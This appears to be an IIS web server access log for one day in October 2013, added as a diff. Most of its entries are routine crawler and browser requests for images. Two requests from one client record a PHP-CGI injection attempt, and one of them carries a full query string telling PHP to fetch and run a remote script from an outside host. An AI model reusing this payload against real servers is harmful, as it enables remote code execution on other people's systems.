@@ -1,0 +1,72 @@
+#Software: Microsoft Internet Information Services 7.5
+#Version: 1.0
+#Date: 2013-10-22 00:17:07
+#Fields: date time s-sitename s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) sc-status sc-substatus sc-win32-status sc-bytes cs-bytes time-taken
+2013-10-22 00:17:07 W3SVC1468 76.72.165.79 GET /Images/NetworkImage/ubnt-nanobridge-m-11.jpg - 80 - 186.7.88.65 Mozilla/5.0+(Windows+NT+6.1;+WOW64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/30.0.1599.69+Safari/537.36 200 0 0 22044 335 1781
+#Software: Microsoft Internet Information Services 7.5
+#Version: 1.0
+#Date: 2013-10-22 01:07:13
+#Fields: date time s-sitename s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) sc-status sc-substatus sc-win32-status sc-bytes cs-bytes time-taken
+2013-10-22 01:07:13 W3SVC1468 76.72.165.79 GET / -s 80 - 113.162.179.146 Mozilla/3.0+(compatible;+Indy+Library) 200 0 0 22611 152 4484
+2013-10-22 01:07:14 W3SVC1468 76.72.165.79 GET / -d+allow_url_include%3d1+-d+auto_prepend_file%3dhttp://florbella.com.br/so.txt 80 - 113.162.179.146 Mozilla/3.0+(compatible;+Indy+Library) 200 0 0 22695 228 250
+#Software: Microsoft Internet Information Services 7.5
+#Version: 1.0
+#Date: 2013-10-22 05:04:30
+#Fields: date time s-sitename s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) sc-status sc-substatus sc-win32-status sc-bytes cs-bytes time-taken
+2013-10-22 05:04:30 W3SVC1468 76.72.165.79 GET /robots.txt - 80 - 157.55.35.49 Mozilla/5.0+(compatible;+bingbot/2.0;++http://www.bing.com/bingbot.htm) 404 0 2 1405 272 921
+2013-10-22 05:15:43 W3SVC1468 76.72.165.79 GET / - 80 - 157.55.35.49 Mozilla/5.0+(compatible;+bingbot/2.0;++http://www.bing.com/bingbot.htm) 200 0 0 4634 275 6015
+#Software: Microsoft Internet Information Services 7.5
+#Version: 1.0
+#Date: 2013-10-22 14:55:57
+#Fields: date time s-sitename s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) sc-status sc-substatus sc-win32-status sc-bytes cs-bytes time-taken
+2013-10-22 14:55:57 W3SVC1468 76.72.165.79 GET / - 80 - 162.243.54.27 Mozilla/5.0+(Windows+NT+6.1;+WOW64;+rv:18.0)+Gecko/20100101+Firefox/18.0 200 0 0 22627 184 3828
+#Software: Microsoft Internet Information Services 7.5
+#Version: 1.0
+#Date: 2013-10-22 19:14:36
+#Fields: date time s-sitename s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) sc-status sc-substatus sc-win32-status sc-bytes cs-bytes time-taken
+2013-10-22 19:14:36 W3SVC1468 76.72.165.79 GET /robots.txt - 80 - 37.140.141.33 Mozilla/5.0+(compatible;+YandexImages/3.0;++http://yandex.com/bots) 404 0 2 1405 193 1406
+#Software: Microsoft Internet Information Services 7.5
+#Version: 1.0
+#Date: 2013-10-22 19:35:32
+#Fields: date time s-sitename s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) sc-status sc-substatus sc-win32-status sc-bytes cs-bytes time-taken
+2013-10-22 19:35:32 W3SVC1468 76.72.165.79 GET /Images/NetworkImage/ubnt-nanobridge-m-11.jpg - 80 - 37.140.141.33 Mozilla/5.0+(compatible;+YandexImages/3.0;++http://yandex.com/bots) 304 0 0 211 332 984
+#Software: Microsoft Internet Information Services 7.5
+#Version: 1.0
+#Date: 2013-10-22 19:56:23
+#Fields: date time s-sitename s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) sc-status sc-substatus sc-win32-status sc-bytes cs-bytes time-taken
+2013-10-22 19:56:23 W3SVC1468 76.72.165.79 GET /Images/HomeEpbx/pluto-104final.jpg - 80 - 37.140.141.33 Mozilla/5.0+(compatible;+YandexImages/3.0;++http://yandex.com/bots) 304 0 0 211 322 1343
+#Software: Microsoft Internet Information Services 7.5
+#Version: 1.0
+#Date: 2013-10-22 20:17:15
+#Fields: date time s-sitename s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) sc-status sc-substatus sc-win32-status sc-bytes cs-bytes time-taken
+2013-10-22 20:17:15 W3SVC1468 76.72.165.79 GET /Images/service.jpg - 80 - 37.140.141.33 Mozilla/5.0+(compatible;+YandexImages/3.0;++http://yandex.com/bots) 304 0 0 211 306 718
+#Software: Microsoft Internet Information Services 7.5
+#Version: 1.0
+#Date: 2013-10-22 20:38:00
+#Fields: date time s-sitename s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) sc-status sc-substatus sc-win32-status sc-bytes cs-bytes time-taken
+2013-10-22 20:37:59 W3SVC1468 76.72.165.79 GET /Images/NetworkImage/dlink.jpg - 80 - 37.140.141.33 Mozilla/5.0+(compatible;+YandexImages/3.0;++http://yandex.com/bots) 304 0 0 211 317 1093
+#Software: Microsoft Internet Information Services 7.5
+#Version: 1.0
+#Date: 2013-10-22 20:58:46
+#Fields: date time s-sitename s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) sc-status sc-substatus sc-win32-status sc-bytes cs-bytes time-taken
+2013-10-22 20:58:46 W3SVC1468 76.72.165.79 GET /Images/HomeDvrImage/DS-7204.jpg - 80 - 37.140.141.33 Mozilla/5.0+(compatible;+YandexImages/3.0;++http://yandex.com/bots) 304 0 0 211 319 640
+#Software: Microsoft Internet Information Services 7.5
+#Version: 1.0
+#Date: 2013-10-22 21:30:29
+#Fields: date time s-sitename s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) sc-status sc-substatus sc-win32-status sc-bytes cs-bytes time-taken
+2013-10-22 21:30:29 W3SVC1468 76.72.165.79 GET /Images/HomeEpbx/Alpha308+KYfinal.jpg - 80 - 37.140.141.33 Mozilla/5.0+(compatible;+YandexImages/3.0;++http://yandex.com/bots) 304 0 0 211 326 1031
+#Software: Microsoft Internet Information Services 7.5
+#Version: 1.0
+#Date: 2013-10-22 22:04:59
+#Fields: date time s-sitename s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) sc-status sc-substatus sc-win32-status sc-bytes cs-bytes time-taken
+2013-10-22 22:04:59 W3SVC1468 76.72.165.79 GET /Images/HomeCameraImage/PXL-DS42D.jpg - 80 - 37.140.141.33 Mozilla/5.0+(compatible;+YandexImages/3.0;++http://yandex.com/bots) 304 0 0 211 324 671
+#Software: Microsoft Internet Information Services 7.5
+#Version: 1.0
+#Date: 2013-10-22 22:48:03
+#Fields: date time s-sitename s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) sc-status sc-substatus sc-win32-status sc-bytes cs-bytes time-taken
+2013-10-22 22:48:03 W3SVC1468 76.72.165.79 GET /Images/HomeCameraImage/PXL-NC38D+copy.jpg - 80 - 37.140.141.33 Mozilla/5.0+(compatible;+YandexImages/3.0;++http://yandex.com/bots) 304 0 0 211 331 546
+#Software: Microsoft Internet Information Services 7.5
+#Version: 1.0
+#Date: 2013-10-22 23:37:33
+#Fields: date time s-sitename s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) sc-status sc-substatus sc-win32-status sc-bytes cs-bytes time-taken
+2013-10-22 23:37:33 W3SVC1468 76.72.165.79 GET /Images/NetworkImage/abcd.jpg - 80 - 37.140.141.33 Mozilla/5.0+(compatible;+YandexImages/3.0;++http://yandex.com/bots) 304 0 0 211 316 906
